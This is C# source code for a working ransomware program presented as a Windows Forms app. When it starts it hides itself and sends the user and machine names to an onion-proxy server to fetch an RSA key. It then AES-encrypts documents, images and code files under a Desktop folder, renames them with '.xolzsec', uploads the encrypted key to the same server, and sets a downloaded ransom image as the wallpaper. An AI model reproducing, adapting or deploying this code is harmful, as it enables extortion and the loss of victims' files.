

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Collections.Specialized;
using System.Net;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Security.Cryptography;
using System.IO;
using System.Runtime.InteropServices;



namespace eda2
{
    public partial class Form1 : Form
    {
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern Int32 SystemParametersInfo(UInt32 action, UInt32 uParam, String vParam, UInt32 winIni);
        private static bool OAEP = false; 
        const int keySize = 2048; //size for RSA algorithm
        string publicKey;
        string encryptedPassword; //AES , RSA public key
        string userName = Environment.UserName;
        string computerName = System.Environment.MachineName.ToString();
        string userDir = "C:\\Users\\" ;
        string generatorUrl = "http://rswvnxg655ryxfk7.onion.cab/x0lzs3c/createkeys.php"; //create key
        string keySaveUrl = "http://rswvnxg655ryxfk7.onion.cab/x0lzs3c/savekey.php"; //luu key
        string backgroundImageUrl = "http://i.imgur.com/UazkYGX.jpg"; //desktop bgr
        string aesPassword;

        public string UserDir { get => userDir; set => userDir = value; }

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Opacity = 0;
            this.ShowInTaskbar = false;
            //starts encryption at form load
            startAction();

        }

        private void Form_Shown(object sender, EventArgs e)
        {
            Visible = false;
            Opacity = 100;
        }

        //Makes a POST request to web server with "username" and "pcname" parameters
        //Webserver responses with the RSA public key and the function returns it.
        public string getPublicKey(string url)
        {

            WebClient webClient = new WebClient();
            NameValueCollection formData = new NameValueCollection();
            formData["username"] = userName;
            formData["pcname"] = computerName;
            byte[] responseBytes = webClient.UploadValues(url, "POST", formData);
            string responsefromserver = Encoding.UTF8.GetString(responseBytes);
            webClient.Dispose();
            return responsefromserver;

        }

        //Sends encryptedPassword variable with "aesencrypted" parameter to web server with a POST request
        public void sendKey(string url)
        {
            WebClient webClient = new WebClient();
            NameValueCollection formData = new NameValueCollection();
            formData["pcname"] = computerName;
            formData["aesencrypted"] = encryptedPassword;
            byte[] responseBytes = webClient.UploadValues(url, "POST", formData);
            string responsefromserver = Encoding.UTF8.GetString(responseBytes);
            webClient.Dispose();
        }

        //Starts the whole process
        public void startAction()
        {
            string path = "\\Desktop\\test";
            string startPath = UserDir + userName + path;
            publicKey = getPublicKey(generatorUrl);
            string aesPassword = CreatePassword(32);
            encryptDirectory(startPath,aesPassword);
            encryptedPassword = EncryptTextRSA(aesPassword, keySize, publicKey);
            sendKey(keySaveUrl);
            aesPassword = null;
            encryptedPassword = null;
            string backgroundImageName = UserDir + userName + "\\ransom.jpg";
            SetWallpaperFromWeb(backgroundImageUrl, backgroundImageName);
            System.Windows.Forms.Application.Exit();

        }

        //AES
        public void EncryptFile(string file, string password)
        {

            byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
            byte[] passwordBytes = Encoding.UTF8.GetBytes(password);

            // Hash the password with SHA256
            passwordBytes = SHA512.Create().ComputeHash(passwordBytes);

            byte[] bytesEncrypted = AES_Encrypt(bytesToBeEncrypted, passwordBytes);

            File.WriteAllBytes(file, bytesEncrypted);
            System.IO.File.Move(file, file + ".xolzsec"); 
        }

        //Encrypts directory and subdirectories
        public void encryptDirectory(string location, string password)
        {

            //extensions to be encrypt
            var validExtensions = new[]
            {
                ".txt", ".doc", ".docx", ".xls", ".xlsx", ".c" , ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd"
            };

            string[] files = Directory.GetFiles(location);
            string[] childDirectories = Directory.GetDirectories(location);
            for (int i = 0; i < files.Length; i++)
            {
                string extension = Path.GetExtension(files[i]);
                if (validExtensions.Contains(extension))
                {
                    EncryptFile(files[i], password);
                }
            }
            for (int i = 0; i < childDirectories.Length; i++)
            {
                encryptDirectory(childDirectories[i], password);
            }


        }

        //Encrypts a string with RSA public key
        public static string EncryptTextRSA(string text, int keySize, string publicKeyXml)
        {
            var encrypted = RSAEncrypt(Encoding.UTF8.GetBytes(text), keySize, publicKeyXml);
            return Convert.ToBase64String(encrypted);
        }

        //Rsa encryption algorithm
        public static byte[] RSAEncrypt(byte[] data, int keySize, string publicKeyXml)
        {
 
            using (var provider = new RSACryptoServiceProvider(keySize))
            {
                provider.FromXmlString(publicKeyXml);
                return provider.Encrypt(data, OAEP);
            }
        }


        //AES encryption algorithm
        public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
        {
            byte[] encryptedBytes = null;
            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;

                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);

                    AES.Mode = CipherMode.CBC;

                    using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                        cs.Close();
                    }
                    encryptedBytes = ms.ToArray();
                }
            }

            return encryptedBytes;
        }

        //Creates an integer value for random generation process
        public static int GetInt(RNGCryptoServiceProvider rnd, int max)
        {
            byte[] r = new byte[4];
            int value;
            do
            {
                rnd.GetBytes(r);
                value = BitConverter.ToInt32(r, 0) & Int32.MaxValue;
            } while (value >= max * (Int32.MaxValue / max));
            return value % max;
        }

        //Generates a random string
        public static string CreatePassword(int length)
        {
            const string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*/&%!="; //pattern
            StringBuilder res = new StringBuilder();
            using (RNGCryptoServiceProvider rnd = new RNGCryptoServiceProvider())
            {
                while (length-- > 0)
                {
                    res.Append(valid[GetInt(rnd, valid.Length)]);
                }
            }
            return res.ToString();
        }

        //Changes desktop background image
        public void SetWallpaper(String path)
        {
            SystemParametersInfo(0x14, 0, path, 0x01 | 0x02);
        }

        //Downloads image from web
        private void SetWallpaperFromWeb(string url, string path)
        {
            WebClient webClient = new WebClient();
            webClient.DownloadFile(new Uri(url), path);
            SetWallpaper(path);
        }

        
    }


}
    

